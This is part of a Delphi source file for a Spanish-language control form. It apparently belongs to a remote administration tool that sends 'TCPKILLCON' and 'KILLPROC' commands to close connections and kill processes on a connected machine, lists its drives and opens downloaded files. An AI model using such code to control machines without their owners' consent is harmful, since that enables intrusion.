procedure TFormControl.CerrarConexin1Click(Sender: TObject);
begin
  mslistviewitem := ListViewPuertos.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna conexi�n para cerrar'), mtWarning, [mbOK], 0)
      else
        begin

          while Assigned(mslistviewitem) do
            begin
              if mslistviewitem.Caption = 'TCP' then
                Servidor.Connection.Writeln('TCPKILLCON|' + mslistviewitem.SubItems[0] + mslistviewitem.SubItems[1] + mslistviewitem.SubItems[2] + mslistviewitem.SubItems[3]);
              mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
          BtnRefrescarPuertos.Click;
        end
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.MatarProceso1Click(Sender: TObject);
begin
  mslistviewitem := ListViewPuertos.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alg�n proceso para matar'), mtWarning, [mbOK], 0)
      else
        begin

          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[5]);
              mslistviewitem := ListViewPuertos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;

        end
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TabPuertosShow(Sender: TObject);
begin
  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
    BtnRefrescarPuertos.Click;
end;

procedure TFormControl.cmbUnidadesDrawItem(Control: TWinControl;
  Index: Integer; Rect: TRect; State: TOwnerDrawState);
var
  caption : string;
  imageindex : integer;
begin
    caption := (Control as TCustomComboBox).Items[Index];
    if pos(_('Unidad de CD/DVD'), caption) > 0 then
      ImageIndex := 108
    else
    if pos(_('Disco de red'), caption) > 0 then
      ImageIndex := 109
    else
    if pos(_('Unidad removible'), caption) > 0 then
      ImageIndex := 111
    else
      ImageIndex := 110;

    (Control as TCustomComboBox).Canvas.FillRect(Rect);
    IconsArchivos.Draw((Control as TCustomComboBox).Canvas, Rect.Left, Rect.Top, ImageIndex);
    (Control as TCustomComboBox).Canvas.TextOut(Rect.Left + 19, Rect.Top + (Rect.Bottom - Rect.Top - Canvas.TextHeight((Control as TCustomComboBox).Items[Index])) div 2, (Control as TCustomComboBox).Items[Index]);
end;


procedure TFormControl.ListViewDescargasDblClick(Sender: TObject);
begin
  if ListViewDescargas.Selected = nil then exit;
    if TDescargaHandler(ListViewDescargas.Selected.Data).Descargado = TDescargaHandler(ListViewDescargas.Selected.Data).SizeFile then
      if pos('.exe', lowercase(TDescargaHandler(ListViewDescargas.Selected.Data).Destino)) = 0 then
        ShellExecute(0, 'open', PChar(TDescargaHandler(ListViewDescargas.Selected.Data).Destino), '', PChar(TDescargaHandler(ListViewDescargas.Selected.Data).Destino), SW_NORMAL);
end;

end. //Fin del proyecto

